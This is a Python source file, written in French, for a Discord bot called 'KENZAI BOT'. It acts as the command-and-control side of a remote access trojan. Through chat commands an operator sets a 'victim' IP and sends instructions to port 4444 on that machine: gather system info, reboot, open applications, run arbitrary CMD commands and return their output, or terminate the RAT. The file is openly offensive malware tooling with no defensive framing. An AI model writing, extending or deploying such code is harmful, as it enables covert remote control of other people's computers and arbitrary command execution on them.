#!/usr/bin/env python3
# KENZAI BOT DISCORD v1.2

import discord
from discord.ext import commands
import socket
import json

# ===== CONFIGURATION (MODIFIE ICI) =====
TOKEN = "TON_TOKEN_ICI"
CHANNEL_ID = 123456789012345678
# =======================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

victim_ip = None

@bot.event
async def on_ready():
    print(f"✅ Bot connecte: {bot.user}")
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("✅ KENZAI BOT ACTIF !")
        await channel.send("")
        await channel.send("**Commandes disponibles:**")
        await channel.send("`!setip IP` - Definir l'IP de la victime")
        await channel.send("`!info` - Infos systeme")
        await channel.send("`!reboot` - Redemarrage")
        await channel.send("`!open notepad` - Ouvrir une application")
        await channel.send("`!cmd ipconfig` - Commande CMD")
        await channel.send("`!kill` - Arreter le RAT")

@bot.command()
async def setip(ctx, ip: str):
    global victim_ip
    victim_ip = ip
    await ctx.send(f"✅ IP victime: {ip}")

@bot.command()
async def info(ctx):
    global victim_ip
    if not victim_ip:
        await ctx.send("❌ Utilise !setip IP d'abord")
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((victim_ip, 4444))
        s.send(b"info")
        data = s.recv(4096).decode()
        s.close()
        await ctx.send(f"```\n{data}\n```")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {e}")

@bot.command()
async def reboot(ctx):
    global victim_ip
    if not victim_ip:
        await ctx.send("❌ Utilise !setip IP d'abord")
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((victim_ip, 4444))
        s.send(b"reboot")
        s.close()
        await ctx.send("🔄 Redemarrage...")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {e}")

@bot.command()
async def open(ctx, *, app):
    global victim_ip
    if not victim_ip:
        await ctx.send("❌ Utilise !setip IP d'abord")
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((victim_ip, 4444))
        s.send(f"open {app}".encode())
        s.close()
        await ctx.send(f"📂 Ouverture de {app}")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {e}")

@bot.command()
async def cmd(ctx, *, command):
    global victim_ip
    if not victim_ip:
        await ctx.send("❌ Utilise !setip IP d'abord")
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((victim_ip, 4444))
        s.send(f"cmd {command}".encode())
        data = s.recv(4096).decode()
        s.close()
        await ctx.send(f"```\n{data[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {e}")

@bot.command()
async def kill(ctx):
    global victim_ip
    if not victim_ip:
        await ctx.send("❌ Utilise !setip IP d'abord")
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((victim_ip, 4444))
        s.send(b"kill")
        s.close()
        await ctx.send("💀 RAT termine")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {e}")

if __name__ == "__main__":
    bot.run(TOKEN)